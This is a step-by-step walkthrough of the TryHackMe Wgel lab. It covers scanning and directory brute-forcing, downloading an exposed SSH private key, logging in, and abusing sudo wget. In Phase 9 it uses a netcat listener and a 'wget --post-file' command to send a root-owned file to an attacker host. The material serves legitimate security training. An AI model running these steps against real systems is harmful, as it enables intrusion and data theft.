# TryHackMe Wgel CTF -- Step‑by‑Step Walkthrough

## 1. Start the Machine

-   Deploy the room in TryHackMe.
-   Note the Target IP address.

Example:

    10.10.x.x

------------------------------------------------------------------------

# Phase 1 -- Reconnaissance

## 2. Run Nmap Scan

    nmap -sS -T4 -A -p- <target-ip>

### Explanation

-   `-sS` → SYN scan\
-   `-T4` → Faster scanning\
-   `-A` → OS & version detection\
-   `-p-` → Scan all ports

### Result

  Port   Service
  ------ ---------
  22     SSH
  80     HTTP

------------------------------------------------------------------------

# Phase 2 -- Web Enumeration

## 3. Visit the Web Application

Open the browser:

    http://<target-ip>

You will see the Apache default page.

### View Page Source

Right click → **View Page Source**

You may notice a hint mentioning a username.

Example:

    Possible username = jessie

------------------------------------------------------------------------

# Phase 3 -- Directory Bruteforce

## 4. Run Gobuster

    gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt

### Possible Results

    /sitemap
    /.ssh

The interesting one:

    http://<target-ip>/.ssh

------------------------------------------------------------------------

# Phase 4 -- Find SSH Private Key

## 5. Access .ssh Directory

Open:

    http://<target-ip>/.ssh/

You may find:

    id_rsa

Download the file.

------------------------------------------------------------------------

# Phase 5 -- Prepare SSH Key

## 6. Save the Private Key

    nano id_rsa

Paste the key content and save.

### Set Proper Permissions

    chmod 600 id_rsa

------------------------------------------------------------------------

# Phase 6 -- SSH Login

## 7. Connect Using SSH Key

    ssh -i id_rsa jessie@<target-ip>

You should now get a shell as:

    jessie

------------------------------------------------------------------------

# Phase 7 -- Capture User Flag

Navigate to Jessie's home directory:

    cd /home/jessie
    ls

Example:

    cat user_flag.txt

------------------------------------------------------------------------

# Phase 8 -- Privilege Escalation

Check sudo privileges:

    sudo -l

Possible output:

    User jessie may run the following commands:
    (root) /usr/bin/wget

------------------------------------------------------------------------

# Phase 9 -- Exfiltrate Root Flag

Start a listener on attacker machine:

    nc -lvnp 4445

Run this on the target machine:

    sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<attacker-ip>:4445

The root flag will appear in your listener.

------------------------------------------------------------------------

# Final Attack Path Summary

1.  Nmap scan
2.  Discover HTTP + SSH
3.  Check webpage source
4.  Run Gobuster
5.  Find exposed `.ssh` directory
6.  Download `id_rsa`
7.  SSH login as `jessie`
8.  Capture user flag
9.  Check `sudo -l`
10. Abuse `wget` with sudo
11. Capture root flag

------------------------------------------------------------------------

# Skills Learned

-   Network reconnaissance
-   Web enumeration
-   Directory brute forcing
-   SSH key authentication
-   Privilege escalation
-   Data exfiltration using wget
